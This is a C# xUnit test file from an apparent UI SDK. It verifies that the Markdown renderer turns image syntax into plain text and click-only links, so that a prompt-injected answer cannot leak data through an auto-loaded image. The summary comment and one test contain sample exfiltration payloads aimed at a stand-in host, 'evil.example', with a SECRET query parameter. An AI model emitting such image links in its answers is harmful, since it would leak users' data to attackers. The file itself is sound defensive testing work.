using System.Text;
using System.Text.Json;
using Fadenstack.UI.Markdown;
using Xunit;

namespace Fadenstack.UI.Tests.Injection;

/// <summary>
/// Gate G4 of the injection suite (sdk/51 7.1): a remote image in an answer is never loaded on its own. The Markdown model of
/// the .NET UI has no image at all: Markdown's image syntax becomes plain text and a link, which opens only when the person
/// clicks it; the WPF and Avalonia skins draw runs, hyperlinks and blocks, never a bitmap. So the exfiltration channel
/// "![x](https://evil.example/?q=...)" does not exist here. OWASP LLM01/LLM02; ASVS 5.0 V1 and V13 (no automatic outbound
/// request). The same corpus as the TypeScript SDK (packages/agents/test/injection/corpus.json), run through the answer parser.
/// TS: packages/agents/test/injection/images.test.ts.
/// </summary>
[Trait("Category", "Injection")]
public sealed class ImageNeverLoadedTests
{
    private static IEnumerable<(string Id, string Content)> Cases()
    {
        var path = Path.Combine(AppContext.BaseDirectory, "Injection", "corpus.json");
        using var document = JsonDocument.Parse(File.ReadAllText(path, new UTF8Encoding(false)));
        foreach (var c in document.RootElement.GetProperty("cases").EnumerateArray())
        {
            var content = c.GetProperty("content").GetString()!;
            if (c.TryGetProperty("padding", out var padding))
            {
                content = string.Concat(Enumerable.Repeat(padding.GetProperty("unit").GetString()!, padding.GetProperty("times").GetInt32())) + content;
            }
            yield return (c.GetProperty("id").GetString()!, content);
        }
    }

    public static IEnumerable<object[]> EveryCase() => Cases().Select(c => new object[] { c.Id });

    [Fact]
    public void The_markdown_model_has_no_image_and_no_run_that_loads_anything()
    {
        var types = typeof(MarkdownBlock).Assembly.GetTypes().Where(t => t.Namespace == "Fadenstack.UI.Markdown").ToList();
        Assert.NotEmpty(types);
        Assert.DoesNotContain(types, t => t.Name.Contains("Image", StringComparison.OrdinalIgnoreCase) || t.Name.Contains("Picture", StringComparison.OrdinalIgnoreCase));
        Assert.DoesNotContain(Enum.GetNames(typeof(InlineStyle)), n => n.Contains("Image", StringComparison.OrdinalIgnoreCase));
        Assert.Equal(new[] { "Text", "Style", "Url" }, typeof(InlineRun).GetProperties().Select(p => p.Name).Where(n => n != "EqualityContract").ToArray());
    }

    [Fact]
    public void A_markdown_image_becomes_text_and_a_link_that_only_a_click_opens()
    {
        var blocks = MarkdownParser.Parse("Look: ![status](https://evil.example/pixel.png?q=SECRET)");
        var runs = Assert.IsType<ParagraphBlock>(Assert.Single(blocks)).Inlines;
        Assert.DoesNotContain(runs, r => r.Url is not null && (r.Style & InlineStyle.Link) == 0); // an address is only ever a link
        Assert.Contains(runs, r => (r.Style & InlineStyle.Link) != 0 && r.Url == "https://evil.example/pixel.png?q=SECRET");
    }

    [Theory]
    [MemberData(nameof(EveryCase))]
    public void Every_corpus_case_as_an_answer_makes_blocks_of_text_and_links_only(string id)
    {
        var content = Cases().Single(c => c.Id == id).Content;
        var blocks = MarkdownParser.Parse(content);
        foreach (var run in Runs(blocks))
        {
            // The only thing in a run that names an address is a link, and only a click follows it.
            Assert.True(run.Url is null || (run.Style & InlineStyle.Link) != 0, "an address outside a link in case " + id);
        }
    }

    [Theory]
    [InlineData("Behaviors/MarkdownText.cs")]
    [InlineData("Views/MarkdownView.cs")]
    public void The_skins_draw_no_bitmap_for_an_answers_markdown(string file)
    {
        var path = Path.Combine(AppContext.BaseDirectory, "Skins", file);
        var source = File.ReadAllText(path, new UTF8Encoding(false));
        foreach (var word in new[] { "BitmapImage", "Bitmap", "Image(", "new Image", "ImageSource", "HttpClient", "WebClient" })
        {
            Assert.DoesNotContain(word, source);
        }
    }

    private static IEnumerable<InlineRun> Runs(IEnumerable<MarkdownBlock> blocks)
    {
        foreach (var block in blocks)
        {
            switch (block)
            {
                case ParagraphBlock p:
                    foreach (var r in p.Inlines) { yield return r; }
                    break;
                case HeadingBlock h:
                    foreach (var r in h.Inlines) { yield return r; }
                    break;
                case ListBlock l:
                    foreach (var r in Runs(l.Items.SelectMany(i => i.Blocks))) { yield return r; }
                    break;
                case QuoteBlock q:
                    foreach (var r in Runs(q.Blocks)) { yield return r; }
                    break;
                case PreviewBlock pv:
                    foreach (var r in Runs(pv.Blocks)) { yield return r; }
                    break;
                case TableBlock t:
                    foreach (var row in new[] { t.Header }.Concat(t.Rows))
                    {
                        foreach (var cell in row.Cells)
                        {
                            foreach (var r in cell) { yield return r; }
                        }
                    }
                    break;
            }
        }
    }
}
